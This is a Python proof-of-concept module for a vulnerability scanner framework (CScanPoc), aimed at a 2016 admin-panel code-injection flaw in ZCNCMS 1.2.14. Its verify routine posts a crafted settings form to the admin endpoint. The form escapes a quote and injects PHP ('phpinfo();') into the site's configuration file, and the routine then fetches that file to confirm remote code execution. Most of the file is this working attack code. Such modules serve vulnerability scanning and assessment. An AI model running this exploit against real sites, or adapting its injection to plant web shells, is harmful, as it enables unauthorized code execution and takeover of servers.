# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib.request
import urllib.parse
import urllib.error
import urllib.request
import urllib.error
import urllib.parse
import re
import hashlib


class Vuln(ABVuln):
    vuln_id = 'ZCNCMS_0004'  # 平台漏洞编号，留空
    name = 'ZCNCMS 后台getshell'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.RCE  # 漏洞类型
    disclosure_date = '2016-08-25'  # 漏洞公布时间
    desc = '''
        zcncms是站长中国基于php技术开发的内容管理系统。
        在文件/include/admincontroller/sys.php中
        将$sys[“closeinfo”]后面的单引号转义，使之和$sys[“webtitle”]的第一个单引号闭合，这样$sys[“webtitle”]的值就摆脱了单引号，再利用注释符”//“注释掉后面的单引号，中间直接可以写shell。
    '''  # 漏洞描述
    ref = 'http://0day5.com/archives/4062/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'ZCNCMS'  # 漏洞应用名称
    product_version = '1.2.14'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '6883efeb-1d9b-4591-92f1-a292a27b36d9'
    author = '47bwy'  # POC编写者
    create_date = '2018-06-26'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payload = '/zcncms/admin/?c=sys'
            data = "isclose=0&closeinfo=1\&webtitle=;phpinfo();//&indextitle=ZCNCMS%E4%B8%93%E6%B3%A8%E5%86%85%E5%AE%B9&webkeywords=ZCNCMS%E4%B8%93%E6%B3%A8%E5%86%85%E5%AE%B9&webdescription=ZCNCMS%E4%B8%93%E6%B3%A8%E5%86%85%E5%AE%B9&webbeian=ZCNCMS%E4%B8%93%E6%B3%A8%E5%86%85%E5%AE%B9&webcopyright=Copyright+%C2%A9+1996-2012%2C+All+Rights+Reserved+ZCNCMS&linkurlmode=0&systemplates=default&submit=%E7%BC%96%E8%BE%91"
            url = self.target + payload
            requests.post(url, data=data)
            verify_url = self.target + '/zcncms/include/sys.inc.php'
            r = requests.get(verify_url)

            if r.status_code == 200 and 'PHP Version' in r.text and 'System' in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
